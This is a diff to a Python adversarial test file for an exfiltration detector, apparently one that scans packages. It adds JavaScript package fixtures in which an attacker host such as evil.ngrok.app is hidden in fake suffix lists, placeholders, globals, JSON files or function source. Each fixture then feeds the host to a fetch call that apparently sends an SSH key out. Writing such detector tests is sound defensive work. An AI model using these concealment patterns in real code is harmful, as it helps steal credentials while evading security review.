@@ -18,7 +18,9 @@ its attack twins (must stay Do not connect):
   Public Suffix List, a host-allowlist suffix) is low only while the key / variable /
   list holding it never reaches a network call. Twins: each shape read back and used
   as the fetch host, and a long filler list (with or without fake suffix-list markers)
-  hiding the host.
+  hiding the host; also the holder read without its name (code on the literal's own
+  lines, a call into the package's own code, a path / iteration / global, a JSON data
+  file, a file or function whose source text is read).
 
 Run from a repo export:
     cd <tree> && python -I tests/adversarial/cases_exfil_precision.py [case ...]
@@ -236,6 +238,16 @@ def host_list(extra, holder="const L = ["):
     return holder + "\n" + body + "];\n"
 
 
+def PSL_BODY(opener):  # noqa: N802 - reads as a constant
+    """A fake suffix list long enough to pass for a bundled one, its markers first."""
+    hosts = ["*.ck", "!www.ck"] + FILLER[:220] + ["evil.ngrok.io"]
+    return opener + "\n" + "".join(f'  "{h}",\n' for h in hosts)
+
+
+FIND_SEND = ("fetch('https://' + lists().find((h) => h.startsWith('evil')) + '/c'"
+             + POST_KEY)
+
+
 TUNNEL_DATA_OK = (
     "const r = await fetch(location.href" + ", {cache: 'no-store'});\n"
     "const answer = await ui.text({\n"
@@ -416,6 +428,84 @@ CASES = {
         "const fs = require('fs');\n"
         "const o = { placeholder: 'evil.ngrok.app' };\n"
         "const host = fs.readFileSync(__filename, 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
+    # (d) second round of #379 review: code on the literal's own lines, a literal handed
+    # to this package's own code, a holder read through a path / iteration / global, a
+    # data file, and a file whose text is read.
+    "fake_suffix_list_returned_by_name": pkg({"index.js": SSH + "function lists() {\n"
+        + PSL_BODY("  const PSL = [") + "  ];\n  return PSL;\n}\n" + FIND_SEND}, main="index.js"),
+    "fake_suffix_list_returned_on_closing_line": pkg({"index.js": SSH + "function lists() {\n"
+        + PSL_BODY("  const PSL = [") + "  ]; return PSL;\n}\n" + FIND_SEND}, main="index.js"),
+    "fake_suffix_list_aliased_on_closing_line": pkg({"index.js": SSH
+        + PSL_BODY("const PSL = [") + "], Q = PSL;\nconst lists = () => Q;\n" + FIND_SEND},
+        main="index.js"),
+    "fake_suffix_list_in_local_cjs_wrapper": pkg({"index.js": SSH + (
+        "function __commonJS(cb) { const m = { exports: {} }; cb[Object.keys(cb)[0]]({}, m); "
+        "fetch('https://' + m.exports.find((h) => h.startsWith('evil')) + '/c'"
+        + POST_KEY.rstrip(";\n") + "); }\n"
+        "var require_rules = __commonJS({ \"node_modules/psl/data/rules.json\"(exports, module) {\n")
+        + PSL_BODY("\tmodule.exports = [") + "\t];\n} });\n"}, main="index.js"),
+    "tunnel_placeholder_aliased_on_same_line": pkg({"index.js": SSH + (
+        "const o = { placeholder: 'evil.ngrok.app' }, h = o.placeholder;\n"
+        "fetch('https://' + h + '/c'" + POST_KEY)}, main="index.js"),
+    "tunnel_placeholder_inline_to_local_reflector": pkg({"index.js": SSH + (
+        "show({ placeholder: 'evil.ngrok.app' });\n"
+        "function show(o) { fetch('https://' + Object.values(o)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "tunnel_placeholder_passed_to_local_reflector": pkg({"index.js": SSH + (
+        "show({\n  message: 'Tunnel',\n  placeholder: 'evil.ngrok.app',\n});\n"
+        "function show(o) { for (const k in o) fetch('https://' + o[k] + '/c'"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "tunnel_placeholder_to_local_method": pkg({"index.js": SSH + (
+        "const ui = { text: (o) => fetch('https://' + Object.values(o)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + ") };\nui.text({\n  placeholder: 'evil.ngrok.app',\n});\n")},
+        main="index.js"),
+    "tunnel_placeholder_to_local_constructor": pkg({"index.js": SSH + (
+        "new Wiz({\n  placeholder: 'evil.ngrok.app',\n});\n"
+        "function Wiz(o) { fetch('https://' + Object.values(o)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "suffix_allowlist_passed_to_local_function": pkg({"index.js": SSH + (
+        "createServer({\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
+        "  ],\n});\nfunction createServer(c) { fetch('https://evil' + Object.values(c)[0][0]"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "tunnel_placeholder_iterated_in_object_list": pkg({"index.js": SSH + (
+        "const steps = [\n  {\n    placeholder: 'evil.ngrok.app',\n  },\n];\n"
+        "steps.forEach((s) => fetch('https://' + Object.values(s)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + "));\n")}, main="index.js"),
+    "tunnel_placeholder_nested_object_reflected": pkg({"index.js": SSH + (
+        "const all = {\n  ui: {\n    placeholder: 'evil.ngrok.app',\n  },\n};\n"
+        "const vs = Object.values(all.ui);\nfetch('https://' + vs[0] + '/c'" + POST_KEY)},
+        main="index.js"),
+    "tunnel_placeholder_set_on_global": pkg({
+        "opts.js": "globalThis.cfg = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": "require('./opts.js');\n" + SSH
+                    + "fetch('https://' + cfg.placeholder + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_classic_script_global": pkg({
+        "opts.js": "var cfg = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": SSH + "fetch('https://' + cfg.placeholder + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_in_json_data_file": pkg({
+        "hosts.json": "{\"placeholder\": \"evil.ngrok.app\"}\n",
+        "index.js": SSH + "const fs = require('fs');\n"
+                    "const h = JSON.parse(fs.readFileSync(__dirname + '/hosts.json')).placeholder;\n"
+                    "fetch('https://' + h + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_file_read_by_other_file": pkg({
+        "opts.js": "const o = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": SSH + "const fs = require('fs');\nconst host = fs.readFileSync("
+                    "require.resolve('./opts'), 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+                    "fetch('https://' + host + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_read_via_runtime_path": pkg({"index.js": SSH + (
+        "const fs = require('fs');\nconst path = require('path');\n"
+        "const o = { placeholder: 'evil.ngrok.app' };\n"
+        "const me = path.join(__dirname, 'index.js');\n"
+        "const host = fs.readFileSync(me, 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
+    "tunnel_placeholder_function_source_read": pkg({"index.js": SSH + (
+        "function cfg() {\n  const o = { placeholder: 'evil.ngrok.app' };\n  return 1;\n}\n"
+        "const host = cfg.toString().match(/[a-z]+[.]ngrok[.]app/)[0];\n"
         "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
 }
 
